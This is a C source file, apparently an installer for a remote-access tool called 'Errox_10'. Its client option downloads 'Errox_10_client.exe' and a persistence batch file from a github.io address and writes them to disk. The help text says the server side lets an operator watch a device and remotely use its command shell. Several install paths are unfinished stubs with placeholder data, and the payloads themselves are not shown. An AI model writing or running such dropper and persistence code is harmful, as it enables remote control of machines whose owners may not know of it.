// Basic headers for C files
#include <stdio.h>
#include <stdbool.h>
// Getting the windows header for Internet and System to make internet connections and create the file(s) needed
#include <Windows.h>
#include <wininet.h>
// Linking wininet.lib to this file, so it can use the syscalls without needing to use the Windows API
#pragma comment(lib, "wininet.lib")

int DownloadFromWeb(char *url, char* outputFile)
{
    HINTERNET handleInternet, handleConnection;
    DWORD bytesRead;
    FILE *fptr;
    // Initalizing the internet connection, by allowing this application to connect through the default connected internet
    handleInternet = InternetOpen(TEXT("Downloader"), INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (handleInternet == NULL)
    {
        printf("[!] ERROR 02: Problem encountered when creating internet connection.\n[#] Rerun with offline mode selected\n");
        return 1;
    }
    // Opening the URL
    handleConnection = InternetOpenUrl(handleInternet, url, NULL, 0, INTERNET_FLAG_RELOAD, 0);
    if (handleConnection == NULL)
    {
        // Closing the internet connection just in case due to the connection failing
        InternetCloseHandle(handleInternet);
        printf("[!] ERROR 03: Problem enountered when connecting to download page.\n[#] Rerun with offline mode selected\n");
        return 2;
    }
    // Opening the output file in write binary mode, so that the output is writen from the internet
    fptr = fopen(outputFile, "wb");
    // If the file cant open (write protected directory/enviorment) close all outbound connections
    if (fptr == NULL)
    {
        InternetCloseHandle(handleConnection);
        InternetCloseHandle(handleInternet);
        printf("[!] ERROR 04: Problem encountered when opening the destination file.\n[#] Rerun with admin permitions.\n");
        return 3;
    }
    // Creating a buffer for the read data
    BYTE buffer[4096];
    // Writing to the file while there is more data to read
    while (InternetReadFile(handleConnection, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0)
    {
        fwrite(buffer, 1, bytesRead, fptr);
    }
    // Closing the file and internet connections
    fclose(fptr);
    InternetCloseHandle(handleConnection);
    InternetCloseHandle(handleInternet);
    printf("Errox_10_client.exe and its persistance Errox_10_persistance.bat were installed with no errors.\n");
    return 0;
}

int InstallClient()
{
    int commandResult;
    // Creating a file opening variable
    FILE *fptr;
    // Creating the files by hand...AAAAGGGGGHHHHH!!!
    const char *embededErrox_10 = "[embeded data]";
    const char *erroxfileName = "Errox_10_client.exe";
    const char *embededPersistance = "[embeded data]";
    const char *persistanceFileName = "Errox_10_persistance.bat";
    return 0;
}

int InstallServer()
{
    int commandResult;
    // Creating a file opening variable
    FILE *fptr;
    // Creating the files by hand...AAAAGGGGGHHHHH!!!
    const char *embededErrox_10 = "[embeded data]";
    const char *erroxfileName = "Errox_10_server.exe";
    return 0;
}

int main()
{
    int mode;
    int offlineInstall;
    int installReturnValue;
    bool mainLoopCheck = true;

    while (mainLoopCheck)
    {
        //Getting the instalation method through a multable choice
        printf("[+] Which instalation method do you wish to use\n[1] Create Server (online install)\n[2] Create Server (offline install)\n[3] Create Client (online install)\n[4] Create Client (install offline)\n[5] Help\n[6] Close this program\n");
        printf(">");
        scanf("%d", &mode);
        switch (mode)
        {
            // Would create the seever script for this computer through an online install
            // Work in progress
            case 1:
                fflush(stdin);
                installReturnValue = DownloadFromWeb("temp", "temp");
                break;
            // Would create the server script for this computer through on offline install
            // Work in progress 
            case 2:
                fflush(stdin);
                installReturnValue = InstallServer(true);
                break;
            // Would create the client script for this computer through an online install
            // Work in progress
            case 3:
                fflush(stdin);
                char* exeName = "Errox_10_client.exe";
                char* perName = "Errox_10_persistance.bat";
                DownloadFromWeb("https://vel2006.github.io/Errox_10/Windows.html", exeName);
                DownloadFromWeb("https://vel2006.github.io/Errox_10/Windows_Per.html", perName);
                break;
            // Would create the client script for this computer through an offline install
            // Work in progress
            case 4:
                fflush(stdin);
                installReturnValue = InstallClient(true);
                // Handling the return codes
                switch (installReturnValue)
                {
                    case 0:
                        printf("Errox_10_client.exe and its persistance Errox_10_persistance.bat were installed with no errors.\n");
                        break;
                }
                break;
            // Displays the help menu that describes all of the instalation methods and what they mean
            case 5:
                fflush(stdin);
                printf("[+] Help menu:\n[#] Server mode: Used on the admin side of Errox_10. It will allow you to see the device's usage and remotly access a client through it's CMD. It can be installed using online or offline modes, online makes page requests through python to automate the creation. Offline creates Errox_10 through this exe file and is faster, but creates an outdated version which is not recommended.\n[#] Client mode: Used on the client side of Errox_10. It is what allows 'server' mode to access the client and get its information. It can be installed using online or offline modes, online makes page requests through python to automate the creation. Offline creates Errox_10 through this exe file and is faster, but creates an outdated version which is not recommended.\n");
                printf("[+] Support the creator at:\n[#] https://github.com/vel2006\n[#] https://www.youtube.com/@That1EthicalHacker");
                break;
            case 6:
                fflush(stdin);
                printf("[+] User selected 6, closing program.\n");
                mainLoopCheck = false;
                break;
            // Bingus Dingus selected something invalid
            default:
                fflush(stdin);
                printf("[!] ERROR 01: invalid option on instalation mode selection.\n[#] Options are:\n[1] = Installs server mode for Errox_10 through page requests.\n[2] = Installs server mode for Errox_10 through hard-coded lines.\n[3] = Installs client mode for Errox_10 through page requests.\n[4] = Installs client mode for Errox_10 through hard-coded lines.\n[5] = Displays help menu\n[6] = Close this program\n");
        }
    }
    return 0;
}
